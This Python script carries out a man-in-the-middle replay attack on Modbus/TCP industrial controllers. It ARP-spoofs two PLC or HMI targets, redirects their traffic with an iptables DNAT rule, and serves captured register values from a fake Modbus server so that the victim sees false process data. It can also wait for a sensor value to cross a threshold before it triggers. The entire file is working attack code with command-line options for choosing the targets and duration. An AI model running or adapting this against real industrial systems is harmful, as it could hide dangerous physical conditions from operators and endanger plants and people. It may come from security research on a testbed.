#from pymodbus.server import StartTcpServer
from pymodbus.server import StartTcpServer, ServerStop
from pymodbus.client import ModbusTcpClient as ModbusClient
from pymodbus.device import ModbusDeviceIdentification
from pymodbus.datastore import ModbusSequentialDataBlock
from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext
from threading import Thread, Event
import time as tm
from datetime import datetime, timedelta
import os
from customdict import Dict
import subprocess
import configparser
import argparse
from scapy.all import get_if_hwaddr
import glob
import operator
from twisted.internet import reactor
import json
from psutil import process_iter
from signal import SIGTERM # or SIGKILL

for proc in process_iter():
    for conns in proc.connections(kind='inet'):
        if conns.laddr.port == 502:
            proc.send_signal(SIGTERM) # or SIGKILL

JSON_PATH = "./registerCapture/historian/"
config_file = "./config.ini"


holding_registers = []
input_registers = []
coils = []
discrete_inputs = []
# holding_registers = dict.holding_output_register_values
# input_registers = dict.input_register_values
# coils = dict.coil_values
# discrete_inputs = dict.discrete_input_values
# print("hr", holding_registers)
# print("ir", input_registers)
# print("co", coils)
# print("di", discrete_inputs)

context = None
thread = None
def check_condition(target_ip, target_port, event, value, cond):
    OPERATOR_SYMBOLS = {
    	'<':  operator.lt,
    	'<=': operator.le,
    	'==': operator.eq,
    	'!=': operator.ne,
    	'>':  operator.gt,
    	'>=': operator.ge
    }
   
    client = ModbusClient(host=target_ip, port=target_port)
    client.connect()
    # read/write holding registers
    while True:
        rd = client.read_input_registers(0, count=4, slave=0)
        #print('Read', rd.registers[:])
        level = rd.registers[0]
        if OPERATOR_SYMBOLS[cond](level, value):
            event.set()
            break
        tm.sleep(1)
    return

def run_arpspoof(target_ip, gateway_ip, duration, event):
    with open(os.devnull, 'w') as devnull:
        process = subprocess.Popen(['arpspoof', '-r', '-i', 'eth0', '-t', target_ip, gateway_ip], stdout=devnull, stderr=devnull)
    print("Arp poisoning started")
    event.wait()
    print("Arp poisoning terminated")
    process.terminate()
    return

def run_arpspoof_reverse(target_ip, gateway_ip):
    with open(os.devnull, 'w') as devnull:
        process = subprocess.Popen(['arpspoof', '-r', '-i', 'eth0', '-t', gateway_ip, target_ip], stdout=devnull, stderr=devnull)
    tm.sleep(60)
    process.terminate()

def parse_config_file(config_file, target_name1,target_name2):
    config = configparser.ConfigParser()
    config.read(config_file)

    ips = []
    ports = []

    ips.append(config.get(target_name1, 'ip'))
    ips.append(config.get(target_name2, 'ip'))
    ports.append(config.get(target_name1, 'port'))
    ports.append(config.get(target_name2, 'port'))
    my_ip=config.get('MY_IP', 'ip')

    return ips, ports, my_ip
    # hmi_ip = config.get("Network", "hmi_ip")
    # hmi_port = config.get("Network", "hmi_port")

    # for section in config.sections():
    #     if section.startswith('plc'):
    #         if plc_names and section not in plc_names:
    #             continue
    #         plc_ips.append(config.get(section, 'ip'))
    #         plc_ports.append(config.get(section, 'port'))

    # return plc_ips, plc_ports, hmi_ip, hmi_port

def updating_writer(context, json_path):
    ''' A worker process that runs every so often and
    updates live values of the context. It should be noted
    that there is a race condition for the update.

    :param arguments: The input arguments to the call
    '''

    (
        discrete_input_values,
        input_register_values,
        holding_output_register_values,
        memory_register_values,
        coil_values
    ) = Dict(json_path)

    context[0].setValues(2, 0, discrete_input_values)
    context[0].setValues(4, 0, input_register_values)
    context[0].setValues(3, 0, holding_output_register_values)
    #context[0].setValues(3, 1024, memory_register_values) # se non troviamo l'address iniziale partiamo da 1024
    context[0].setValues(1, 0, coil_values)


def run_async_server(event):
    # initialize data store
    global context
    global thread
    store = ModbusSlaveContext(
        di=ModbusSequentialDataBlock(1, [0]*88),
        co=ModbusSequentialDataBlock(1, [0]*88),
        hr=ModbusSequentialDataBlock(1, [0]*11),
        ir=ModbusSequentialDataBlock(1, [0]*11))
    context = ModbusServerContext(slaves=store, single=True)
    
    # initialize the server information
    identity = ModbusDeviceIdentification()
    identity.VendorName = 'APMonitor'
    identity.ProductCode = 'APM'
    identity.VendorUrl = 'https://apmonitor.com'
    identity.ProductName = 'Modbus Server'
    identity.ModelName = 'Modbus Server'
    identity.MajorMinorRevision = '3.0.2'

    # times = 5 # 5 seconds delay
    # loop = LoopingCall(f=updating_writer, a=(context,))
    # loop.start(times, now=False) # initially delay by time
    
    thread = Thread(target=StartTcpServer, kwargs={"context":context,"host":'localhost',"identity":identity,"address":("0.0.0.0", 502)})
    thread.start()
    
    # TCP Server
    #StartTcpServer(context=context, host='localhost',\
    #               identity=identity, address=("127.0.0.1", 5030))
    '''
    print("context:",context[0].getValues(3, 0, count=4))
    updating_writer(context)
    time.sleep(7)
    print("aaaaaaaa")
    print("context:",context[0].getValues(3, 0, count=4))
    updating_writer(context)
    '''
    return

def time_difference(time_str1, time_str2): 
    format_str = "%H:%M:%S.%f" 
    time1 = datetime.strptime(time_str1, format_str) 
    time2 = datetime.strptime(time_str2, format_str) 
    time_diff = time2 - time1 
    return time_diff.total_seconds() 

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', nargs = 2,required=True, help='PLCs to attack')
    parser.add_argument('--time', type=int, required=True, help='Attack duration in minutes')
    #parser.add_argument('--manual', action='store_true', help='Manually start the Modbus slaves')
    parser.add_argument('--condition', type=str, help='Operator condition to start the attack', default=None)
    parser.add_argument('--value', type=int, help= 'Value Condition to start attack')
    args = parser.parse_args()

    target = args.target
    #to_masquerade = targets[0]

    
    if not set(target).issubset(set(['plc1', 'plc2', 'plc3','hmi'])) or target[0] == target[1]:
        print('Please, select a valid couple of devices')
        return

    # if not args.time:
    #     print('Please provide the capture duration')
    #     return
    
    json_files = glob.glob(os.path.join(JSON_PATH, f"{target[0]}*.json"))
    json_files.sort()
    
    if not json_files:
        print('No PLC or JSON files found with the specified prefixes')
        return

    tm.sleep(10)
    target_ips, target_ports, my_ip = parse_config_file(config_file, target[0], target[1])

    target1_ip = target_ips[0]
    print("ip_obfuscated", target1_ip)
    target2_ip = target_ips[1]
    print("ip_attacked", target2_ip)
    attacker_mac = get_if_hwaddr('eth0')  #Replace "eth0" with your network interface name
    print("attacker_mac", attacker_mac)
    
    event2 = Event()
    thread1 = Thread(target=run_arpspoof, args=(target1_ip, target2_ip, (args.time*60)+10, event2))
    #thread2 = Thread(target=run_arpspoof_reverse, args=(target1_ip, target2_ip))
    thread1.start()
    #thread2.start()
    #tm.sleep(10)

   # print('Modbus server started on localhost port: 502')
   # run_async_server(event2)
    global thread
    if (args.condition != None) :  
        print('Checking Condition')
        event = Event()
        thread2 = Thread(target=check_condition, args=(target1_ip, target_ports[0], event, args.value, args.condition))
        thread2.start()
        event.wait()

    print('Modbus server started on localhost port: 502')
    run_async_server(event2)
    result=subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', 'eth0', '-s', target2_ip, '-d', target1_ip, '-j', 'DNAT', '--to-destination', my_ip])
    c = 0
    starting_time = datetime.now()
    while (datetime.now()-starting_time) <= timedelta(seconds=args.time*60):
        fl = json_files[c]
        ac_time = os.path.basename(os.path.splitext(fl)[0]).split('@')[1].split(' ')[1]
        #print("Time", ac_time)
        updating_writer(context, fl)
        #print("context:",context[0].getValues(4, 0, count=8))
        #print("Path: ", fl)
        c += 1
        if c >= len(json_files): break
        fl = json_files[c]
        #print(os.path.basename(fl))
        nxt_time = os.path.basename(os.path.splitext(fl)[0]).split('@')[1].split(' ')[1]
        t_diff = time_difference(ac_time, nxt_time)
        tm.sleep(t_diff)
   
    event2.set()
    result2=subprocess.run(['iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', 'eth0', '-s', target2_ip, '-d', target1_ip, '-j', 'DNAT', '--to-destination', my_ip])
    print('Shutting down server.')
    ServerStop()
    print('Server shutdown correctly')
    print('RET')
 
if __name__ == "__main__":
    main()
    tm.sleep(10)
